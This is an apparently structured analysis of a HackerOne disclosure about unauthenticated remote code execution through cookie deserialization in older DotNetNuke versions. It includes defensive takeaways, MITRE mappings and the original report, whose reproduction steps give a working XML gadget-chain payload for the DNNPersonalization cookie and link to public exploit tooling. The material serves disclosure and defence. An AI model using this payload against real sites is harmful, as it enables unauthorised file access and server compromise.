# Remote Code Execution through DNN Cookie Deserialization

## Metadata
- **Source:** HackerOne
- **Report:** 876708 | https://hackerone.com/reports/876708
- **Submitted:** 2020-05-17
- **Reporter:** cristiancornea
- **Program:** DotNetNuke (DNN)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Unsafe Deserialization, Remote Code Execution, Arbitrary File Read/Write
- **CVEs:** None
- **Category:** memory-binary

## Summary
DotNetNuke versions prior to 9.3.0-RC contain an unsafe deserialization vulnerability in the DNNPersonalization cookie that allows unauthenticated attackers to execute arbitrary code and read/write files on the server. The vulnerability exploits .NET gadget chains through the System.Data.Services.Internal.ExpandedWrapper class to achieve RCE.

## Attack scenario
1. Attacker identifies a DotNetNuke instance running a vulnerable version (<9.3.0-RC)
2. Attacker crafts a malicious XML payload using ysoserial.net or similar tools with .NET gadget chains targeting FileSystemUtils or command execution methods
3. Attacker injects the payload into the DNNPersonalization cookie header in an HTTP request
4. The application deserializes the untrusted cookie data without proper validation
5. Gadget chain executes during deserialization, triggering arbitrary method invocations (WriteFile, command execution)
6. Attacker achieves RCE, file write access, or sensitive file exfiltration depending on payload configuration

## Root cause
DotNetNuke deserializes user-controlled data from the DNNPersonalization cookie without implementing input validation or employing secure deserialization practices. The application uses dangerous .NET deserialization APIs that allow instantiation of arbitrary types and method invocation through gadget chains.

## Attacker mindset
An opportunistic attacker would scan for DotNetNuke instances and attempt this low-effort exploit requiring only HTTP requests and no authentication. The vulnerability enables lateral movement, persistence, and complete system compromise through file write capabilities and RCE.

## Defensive takeaways
- Never deserialize untrusted data; implement strict input validation or use safe serialization formats (JSON with type restrictions)
- Upgrade to DotNetNuke 9.3.0-RC or later immediately
- Implement SerializationBinder to whitelist safe types during deserialization
- Use ObjectStateFormatter alternatives or custom serialization logic with cryptographic signatures
- Apply network segmentation to limit impact of compromised web servers
- Monitor for suspicious cookie structures and deserialization exceptions in logs
- Implement Web Application Firewall (WAF) rules to detect XML-based gadget chain payloads in cookies

## Variant hunting
Search for other DNN-specific cookies that may undergo unsafe deserialization (e.g., ViewState, authentication tokens)
Investigate similar gadget chain exploitation in other .NET frameworks using ObjectDataProvider
Check for unauthenticated endpoints accepting serialized data in request bodies or headers
Look for deserialization vulnerabilities in custom DNN modules or third-party plugins
Test whether other methods in FileSystemUtils or related classes can be chained for data exfiltration

## MITRE ATT&CK
- T1190
- T1203
- T1059
- T1041
- T1567

## Notes
This vulnerability is pre-authentication and extremely high-impact. The use of System.Data.Services gadgets suggests familiarity with .NET deserialization exploitation techniques. The official DotNetNuke security advisory and Exploit-DB reference indicate this is a known, exploited vulnerability with public tooling available.

## Full report
<details><summary>Expand</summary>

**Summary:**
The application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write

## Step-by-step Reproduction Instructions

1. Navigate to a random page that must return a 404 Error status like ```https://████/test```
2. Add this cookie in the request header: ```DNNPersonalization```
3. Insert the payload into the ```DNNPersonalization``` cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:

```
<profile>
<item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<ExpandedElement/>
<ProjectedProperty0>
<MethodName>WriteFile</MethodName>
<MethodParameters>
<anyType xsi:type="xsd:string">test</anyType>
</MethodParameters>
<ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
</ProjectedProperty0>
</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
</item>
</profile>
```

Where ```test``` is the wanted file

Expected result:
████


## Product, Version, and Configuration (If applicable)
Platform: https://████████/shell.aspx
Vulnerable Product: DotNetNuke
Vulnerable Version: < 9.3.0-RC


## Suggested Mitigation/Remediation Actions
Update the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable

## Impact

An attacker can execute remote commands on the system and gain unauthorized access to it.

</details>

---
*Analysed by Claude on 2026-05-11*
